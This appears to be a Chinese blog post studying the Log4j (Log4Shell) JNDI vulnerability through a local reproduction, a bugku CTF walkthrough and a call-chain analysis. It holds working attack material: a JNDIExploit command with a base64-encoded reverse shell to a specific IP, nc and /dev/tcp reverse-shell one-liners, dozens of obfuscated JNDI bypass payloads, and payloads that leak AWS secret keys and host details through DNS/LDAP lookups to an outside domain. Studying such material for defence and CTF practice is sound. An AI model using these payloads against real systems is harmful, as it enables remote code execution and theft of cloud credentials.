---
date: 2023-04-27 17:20:48

title: 【Log4J】JAVA安全--log4j漏洞研究分析
---

![InterviewCoder](https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png)
## 【Log4J】JAVA安全--log4j漏洞研究分析
<div id="content_views" class="markdown_views prism-atom-one-light"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <p>前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧</p> 
 <h1><a id="log4j_1"></a>log4j漏洞复现</h1> 
 <h2><a id="_2"></a><mark>本地复现</mark></h2> 
 <p>这个很多人写了 可直接参考这个<br> https://cloud.tencent.com/developer/article/1917856</p> 
 <pre><code class="prism language-bash"><span class="token function">import</span> org.apache.logging.log4j.Logger<span class="token punctuation">;</span>
<span class="token function">import</span> org.apache.logging.log4j.LogManager<span class="token punctuation">;</span>


public class log4jRCE <span class="token punctuation">{<!-- --></span>
    private static final Logger logger <span class="token operator">=</span> LogManager.getLogger<span class="token punctuation">(</span>log4jRCE.class<span class="token punctuation">)</span><span class="token punctuation">;</span>
    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        logger.error<span class="token punctuation">(</span><span class="token string">"<span class="token variable">${jndi:ldap://服务器的地址/TomcatBypass/Command/Base64/Y2FsYw==}</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
 <p>这篇文章里面还缺了一点东西<br> 就是idea生成jar文件的方法<br> 这里一起写出来<br> ①打开模块设置<br> <img src="https://img-blog.csdnimg.cn/d8ebe78065f64a89bc310583697bb07a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ②选模块<br> <img src="https://img-blog.csdnimg.cn/c80ad1af9e7d41e080646823d703c488.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③选好主类以及生成的文件在哪些地方<br> <img src="https://img-blog.csdnimg.cn/d4d877b6969643438f51f2f9019bd2bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④选择包含在项目构建中然后点击应用<br> <img src="https://img-blog.csdnimg.cn/95acb2cb63304dea8d51d75dd29c7414.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 编译生成即可<br> <img src="https://img-blog.csdnimg.cn/08fd4bd415414dca979f9b7349771ecb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 但是对于这个我是失败了的 不知道啥原因<img src="https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png" alt="在这里插入图片描述"></p> 
 <p>本地编写jar方法</p> 
 <pre><code class="prism language-bash">①把java编写为class文件
javac  Exploit.java
②把class编写为jar文件
java -jar Exploit.jar Exploit.class
</code></pre> 
 <h2><a id="_44"></a><mark>在线靶场复现</mark></h2> 
 <p>这里以bugku上的靶场为例进行复现<br> https://ctf.bugku.com/challenges/detail/id/340.html<br> <img src="https://img-blog.csdnimg.cn/76c81b1f01f04623b82176d1a99f74f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 环境配置<br> ①ldap服务<br> <img src="https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png" alt="在这里插入图片描述"></p> 
 <p>服务器起一个ldap服务就好了<br> java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 服务器的地址<br> <img src="https://img-blog.csdnimg.cn/a34a810cfebc4625992a4661a949141b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 直接执行反弹shell<br> 即直接配置bash反弹shell命令</p> 
 <pre><code class="prism language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}"</span> -A <span class="token string">"192.168.72.1"</span>
</code></pre> 
 <p>②nc配置（windows的话）<br> 起到获取flag的思路<br> https://eternallybored.org/misc/netcat/<br> 下载好后进行监听即可<br> nc -lvnp 端口<br> <img src="https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png" alt="在这里插入图片描述"></p> 
 <p>思路1<br> 不反弹shell进行获取flag</p> 
 <pre><code class="prism language-bash">user<span class="token operator">=</span><span class="token variable">${jndi:ldap://服务器的ip:1389/TomcatBypass/TomcatEcho}</span><span class="token operator">&amp;</span>pwd<span class="token operator">=</span>69be4a983341add38e2ad1e5c804568a
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/b5df419f4de342d880d643a16afda976.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/444bc67397494e49b4bdd68a7ecf7595.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 思路2<br> 进行反弹shell获取</p> 
 <pre><code class="prism language-bash">常见反弹shell的思路
①nc ip 12345 -e /bin/sh

②bash -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/启动nc服务器的ip/9999 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
<span class="token comment">#然后先base64编码然后对编码后的特殊字符进行2层url转码</span>



这台要用第一个命令,题目限定了
payload<span class="token operator">=</span><span class="token variable">${jndi:ldap:1/服务器ip:1389/basic/Command/Base64/二层转码之后的字符}</span>

</code></pre> 
 <p>反弹shell后执行即可</p> 
 <p><img src="https://img-blog.csdnimg.cn/e08749697c9b4afa8bf3e14c080d64a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/ae8c7c82b468476a94e481ff0eba637a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/435deaf0004c4ae5b7c83372964c06fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_103"></a><mark>知识点分析</mark></h1> 
 <p>受影响版本<br> Apache log4j 2.0-beta9 ≤ 2.14.1<br> 组件<br> org.apache.logging.log4j，且版本号小于2.15.0-rc2</p> 
 <p>ldap基础知识以及服务原因</p> 
 <h2><a id="payload_111"></a><mark>payload总结</mark></h2> 
 <p>参考知识点：来源团队的雪晴师傅的<br> https://www.yuque.com/yq1ng/java/pbica2#xrVeI<br> 基础payload<br> ${jndi:ldap://t00ls.com/poc<br> 绕过的一些payload</p> 
 <pre><code class="prism language-bash"><span class="token variable">${jndi:ldap://domain.com/j}</span>
<span class="token variable">${jndi:ldap:/domain.com/a}</span>
<span class="token variable">${jndi:dns:/domain.com}</span>
<span class="token variable">${jndi:dns://domain.com/j}</span>
<span class="token variable">${${::-j}</span><span class="token variable">${::-n}</span><span class="token variable">${::-d}</span><span class="token variable">${::-i}</span><span class="token keyword">:</span><span class="token variable">${::-r}</span><span class="token variable">${::-m}</span><span class="token variable">${::-i}</span>://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${${::-j}</span>ndi:rmi://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:rmi://domainldap.com/j}</span>
<span class="token variable">${${lower:jndi}</span><span class="token keyword">:</span><span class="token variable">${lower:rmi}</span>://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${${lower:${lower:jndi}</span><span class="token punctuation">}</span>:<span class="token variable">${lower:rmi}</span>://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${${lower:j}</span><span class="token variable">${lower:n}</span><span class="token variable">${lower:d}</span>i:<span class="token variable">${lower:rmi}</span>://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${${lower:j}</span><span class="token variable">${upper:n}</span><span class="token variable">${lower:d}</span><span class="token variable">${upper:i}</span><span class="token keyword">:</span><span class="token variable">${lower:r}</span>m<span class="token variable">${lower:i}</span><span class="token punctuation">}</span>://domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:${lower:l}</span><span class="token variable">${lower:d}</span>a<span class="token variable">${lower:p}</span>://domain.com<span class="token punctuation">}</span>
<span class="token variable">${${env:NaN:-j}</span>ndi<span class="token variable">${env:NaN:-:}</span><span class="token variable">${env:NaN:-l}</span>dap<span class="token variable">${env:NaN:-:}</span>//domain.com/a<span class="token punctuation">}</span>
jn<span class="token variable">${env::-}</span>di:
jn<span class="token variable">${date:}</span>di$<span class="token punctuation">{<!-- --></span>date:<span class="token string">':'</span><span class="token punctuation">}</span>
j<span class="token variable">${k8s:k5:-ND}</span>i<span class="token variable">${sd:k5:-:}</span>
j<span class="token variable">${main:\k5:-Nd}</span>i<span class="token variable">${spring:k5:-:}</span>
j<span class="token variable">${sys:k5:-nD}</span><span class="token variable">${lower:i${web:k5:-:}</span><span class="token punctuation">}</span>
j<span class="token variable">${::-nD}</span>i<span class="token variable">${::-:}</span>
j<span class="token variable">${EnV:K5:-nD}</span>i:
j<span class="token variable">${loWer:Nd}</span>i<span class="token variable">${uPper::}</span>

</code></pre> 
 <p>信息泄露(主要是针对不出网的)</p> 
 <pre><code class="prism language-bash"><span class="token variable">${jndi:ldap://${env:user}</span>.domain.com/exp<span class="token punctuation">}</span>
<span class="token variable">${jndi:dns://${hostName}</span>.domain.com/a<span class="token punctuation">}</span>
<span class="token variable">${jndi:dns://${env:COMPUTERNAME}</span>.domain.com/a<span class="token punctuation">}</span>
<span class="token variable">${jndi:dns://${env:USERDOMAIN}</span>.domain.com/a<span class="token punctuation">}</span>
<span class="token variable">${jndi:dns://${env:AWS_SECRET_ACCESS_KEY.domain.com/a}</span>
<span class="token variable">${jndi:ldap://${ctx:loginId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${map:type}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${filename}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${date:MM-dd-yyyy}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${docker:containerId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${docker:containerName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${docker:imageName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${env:USER}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${event:Marker}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${mdc:UserId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${java:runtime}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${java:vm}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${java:os}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${jndi:logging/context-name}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${hostName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${docker:containerId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:accountName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:clusterName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:containerId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:containerName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:host}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:labels.app}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:labels.podTemplateHash}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:masterUrl}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:namespaceId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:namespaceName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:podId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:podIp}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:podName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:imageId}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${k8s:imageName}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${log4j:configLocation}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${log4j:configParentLocation}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${spring:spring.application.name}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:myString}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:0}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:1}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:2}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:3}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:4}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${main:bar}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${name}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${marker}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${marker:name}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${spring:profiles.active[0].domain.com/j}</span>
<span class="token variable">${jndi:ldap://${sys:logPath}</span>.domain.com/j<span class="token punctuation">}</span>
<span class="token variable">${jndi:ldap://${web:rootDir}</span>.domain.com/j<span class="token punctuation">}</span>
</code></pre> 
 <p>可检查的标头</p> 
 <pre><code class="prism language-bash">Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Referer
TE
True-Client-IP
True-Client-Ip
Upgrade
User-Agent
Via
Warning
X-ATT-DeviceId
X-Api-Version
X-Att-Deviceid
X-CSRFToken
X-Client-Ip
X-Correlation-ID
X-Csrf-Token
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forward-For
X-Forward-Proto
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Frame-Options
X-From
X-Geoip-Country
X-HTTP-Method-Override
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Originating-Ip
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Request-ID
X-Requested-With
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token
</code></pre> 
 <p>除ldap以外的其他构造方式</p> 
 <pre><code class="prism language-bash">jndi:ldap:/
jndi:rmi:/
jndi:ldaps:/
jndi:dns:/
jndi:nis:/
jndi:nds:/
jndi:corba:/
jndi:iiop:/
jndi:$<span class="token punctuation">{<!-- --></span>
</code></pre> 
 <p>可获取查找的信息</p> 
 <pre><code class="prism language-bash"><span class="token variable">${hostName}</span>
<span class="token variable">${sys:user.name}</span>
<span class="token variable">${sys:user.home}</span>
<span class="token variable">${sys:user.dir}</span>
<span class="token variable">${sys:java.home}</span>
<span class="token variable">${sys:java.vendor}</span>
<span class="token variable">${sys:java.version}</span>
<span class="token variable">${sys:java.vendor.url}</span>
<span class="token variable">${sys:java.vm.version}</span>
<span class="token variable">${sys:java.vm.vendor}</span>
<span class="token variable">${sys:java.vm.name}</span>
<span class="token variable">${sys:os.name}</span>
<span class="token variable">${sys:os.arch}</span>
<span class="token variable">${sys:os.version}</span>
<span class="token variable">${env:JAVA_VERSION}</span>
<span class="token variable">${env:AWS_SECRET_ACCESS_KEY}</span>
<span class="token variable">${env:AWS_SESSION_TOKEN}</span>
<span class="token variable">${env:AWS_SHARED_CREDENTIALS_FILE}</span>
<span class="token variable">${env:AWS_WEB_IDENTITY_TOKEN_FILE}</span>
<span class="token variable">${env:AWS_PROFILE}</span>
<span class="token variable">${env:AWS_CONFIG_FILE}</span>
<span class="token variable">${env:AWS_ACCESS_KEY_ID}</span>
</code></pre> 
 <p>一张脑图（有一说一不是很懂这个）<br> <img src="https://img-blog.csdnimg.cn/f44b105478ca4b4ebacd60249c65cf9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_329"></a><mark>批量验证工具</mark></h2> 
 <p><a href="https://github.com/inbug-team/Log4j_RCE_Tool">log4j批量检测工具</a><br> 这个是主动检测的<br> 但是自己测了下,发觉测不出东西<br> 但是主动检测的太少了 还是把这个工具扔在这里<br> <img src="https://img-blog.csdnimg.cn/8e9287f280ce40e89c435dfb54e36a3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_335"></a>原理研究</h1> 
 <h2><a id="_336"></a>基础知识点</h2> 
 <p>JNDI<br> 全名：Java命名和目录接口，自己理解就是定义一个名称去绑定对象或者资源进而进行操控<br> 作用：将名称与java对象或资源关联起来，进行通过名称调用到对应的对象或者资源<br> 可操控的目录与服务有： DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、WindowsXP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p> 
 <p>运用方法：<br> 如JNDI数据源配置（使用的原因 只配置一次①加载数据库驱动程序、②连接数据库、④关闭数据库，释放连接，减少性能消耗）<br> 这个师傅讲的比较好了 这里就不讲了</p> 
 <p><a href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">参考链接</a></p> 
 <p><img src="https://img-blog.csdnimg.cn/6fc8cdd5e2034b02ac1cc2ce1791f925.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>LDAP(轻量目录访问协议)<br> LDAP目录服务：由目录数据库和一套访问协议组成的系统。<br> 作用：即存储描述属性的数据和详细信息的数据库。<br> 四种模型：</p> 
 <pre><code class="prism language-bash">信息模型
命名模型
功能模型
安全模型
</code></pre> 
 <p>连接LDAP数据库方法：</p> 
 <pre><code class="prism language-bash"><span class="token variable">$ldapconn</span> <span class="token operator">=</span> ldap_connect<span class="token punctuation">(</span>“10.1.8.78<span class="token string">")
<span class="token variable">$ldapbind</span> = ldap_bind(<span class="token variable">$ldapconn</span>, 'username', <span class="token variable">$ldappass</span>);
<span class="token variable">$searchRows</span>= ldap_search(<span class="token variable">$ldapconn</span>, <span class="token variable">$basedn</span>, "</span><span class="token punctuation">(</span>cn<span class="token operator">=</span>*<span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$searchResult</span> <span class="token operator">=</span> ldap_get_entries<span class="token punctuation">(</span><span class="token variable">$ldapconn</span>, <span class="token variable">$searchRows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ldap_close<span class="token punctuation">(</span><span class="token variable">$ldapconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
 <p>lookup：允许在写日志的时候，通过关键词去查找对象，输出对象，并实现对象功能。这个对象可以存储在硬盘中或者服务器上。</p> 
 <p>这个漏洞调用的就是这个接口</p> 
 <p>Codebase<br> 概念：一种服务<br> 作用：存储代码或者编译文件作用，可通过名称进行编译文件或者获取代码。</p> 
 <p>RMI协议：<br> 概念：远程方法调用协议，通过网络从远程计算机上请求调用某种服务。(只适合java)</p> 
 <p>原理：</p> 
 <pre><code class="prism language-bash">1.客户调用客户端辅助对象stub上的方法
2.客户端辅助对象stub打包调用信息（变量，方法名），通过网络发送给服务端辅助对象skeleton
3.服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象
4.调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton
5.服务端辅助对象将结果打包，发送给客户端辅助对象stub
6.客户端辅助对象将返回值解包，返回给调用者
7.客户获得返回值
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/3fa499394fd24ae781a710675c8acd81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_398"></a>漏洞原理知识点：</h2> 
 <p>加载原理：通过rmi进行从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类，进而造成RCE漏洞<br> <img src="https://img-blog.csdnimg.cn/69df0ca22e0b4552813cbd614b9b1583.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/f1dd7030daf84ef7a761550d2ce3145a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 详细跟进分析<br> 完整的调用链</p> 
 <pre><code class="prism language-bash">lookup:172, JndiManager <span class="token punctuation">(</span>org.apache.logging.log4j.core.net<span class="token punctuation">)</span>
lookup:56, JndiLookup <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
lookup:223, Interpolator <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
resolveVariable:1116, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:1038, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:912, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
replace:467, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
format:132, MessagePatternConverter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
format:38, PatternFormatter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
toSerializable:345, PatternLayout<span class="token variable">$PatternSerializer</span> <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
toText:244, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:229, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:59, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
directEncodeEvent:197, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryAppend:190, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
append:181, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryCallAppender:156, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender0:129, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenderPreventRecursion:120, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender:84, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenders:543, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
processLogEvent:502, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:485, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:460, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:63, DefaultReliabilityStrategy <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:161, Logger <span class="token punctuation">(</span>org.apache.logging.log4j.core<span class="token punctuation">)</span>
tryLogMessage:2198, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageTrackRecursion:2152, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageSafely:2135, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessage:2011, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logIfEnabled:1983, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
error:740, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
main:8, log4jRCE
</code></pre> 
 <p>这里要重点关注的几个点,其余的点几乎都是调用方法或者是进行过滤操作获取数字等</p> 
 <p>①这里进行判断了日志等级 如果是小于配置文件的即不能进入 this.logMessage()进行触发漏洞<br> 日志等级 默认只要大于error()和fatal()可以触发漏洞就可以触发漏洞了 具体看配置情况</p> 
 <pre><code class="prism language-bash">日志一共分为8个级别，由低到高依次为：All <span class="token operator">&lt;</span> Trace <span class="token operator">&lt;</span> Debug <span class="token operator">&lt;</span> Info <span class="token operator">&lt;</span> Warn <span class="token operator">&lt;</span> Error <span class="token operator">&lt;</span> Fatal <span class="token operator">&lt;</span> OFF。
1.All：最低等级的，用于打开所有日志记录。
2.Trace：是追踪，就是程序推进以下，你就可以写个trace输出，所以trace应该会特别多，不过没关系，我们可以设置最低日志级别不让他输出。
3.Debug：指出细粒度信息事件对调试应用程序是非常有帮助的。
4.Info：消息在粗粒度级别上突出强调应用程序的运行过程。
5.Warn：输出警告及warn以下级别的日志。
6.Error：输出错误信息日志。
7.Fatal：输出每个严重的错误事件将会导致应用程序的退出的日志。
8.OFF：最高等级的，用于关闭所有日志记录。
</code></pre> 
